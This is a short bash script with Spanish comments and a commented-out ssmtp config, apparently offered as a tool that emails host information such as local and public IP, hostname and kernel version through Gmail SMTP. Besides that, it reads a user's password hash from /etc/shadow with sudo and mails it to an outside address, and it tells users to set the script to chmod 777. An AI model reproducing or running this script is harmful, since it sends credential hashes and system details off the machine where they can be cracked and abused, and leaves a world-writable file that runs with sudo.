#!/bin/bash
# envia ip a gmail por smtp


# script que envia informacion del host como: ip local, ip pulbica, nombre host, contraseña de usuario encriptada en md5, version kernel, etc via correo.

# copiar script en ~/.gnome2/nemo-scripts/

# y dar permiso de ejecucion: chmod 777



# Changelog:
# Instalar ssmtp y configurar /etc/ssmtp/ssmtp.conf

#
# Config file for sSMTP sendmail
#
# The person who gets all mail for userids < 1000
# Make this empty to disable rewriting.
# root=yourmail@mail.com

# The place where the mail goes. The actual machine name is required no
# MX records are consulted. Commonly mailhosts are named mail.domain.com
# en caso de usar gmail
# mailhub=mailhub=smtp.gmail.com:587

# Where will the mail seem to come from?
# rewriteDomain=

# The full hostname
# hostname=yourserver.example.com

# Are users allowed to set their own From: address?
# YES - Allow the user to specify their own From: address
# NO - Use the system generated From: address
# FromLineOverride=YES

# Username and password for Google\'s Gmail servers
# From addresses are settled by Mutt\'s rc file, so
# with this setup one can still achieve multi-user SMTP
# AuthUser=username@gmail.com
# AuthPass=password
# AuthMethod=LOGIN



IP_PRIVADA=$(ifconfig | grep 'inet:192.168.')
IP_PUBLICA=$(w3m icanhazip.com)
USUARIO=$(hostname)
SO=$(uname -o -v)
ARQ=$(uname -m)
KERNEL=$(uname -r)
PASSWORD=$(sudo cat /etc/shadow | grep '[cambiar usuario]')
MENSAJE="
IP privada= $IP_PRIVADA
IP publica= $IP_PUBLICA
Usuario= $USUARIO
Sistema Operativo= $SO
Arquitectura= $ARQ
Kernel= $KERNEL
PASSWORD= $PASSWORD
"
echo "$MENSAJE" | ssmtp "Info de $USUARIO" [cambiar correo destino]
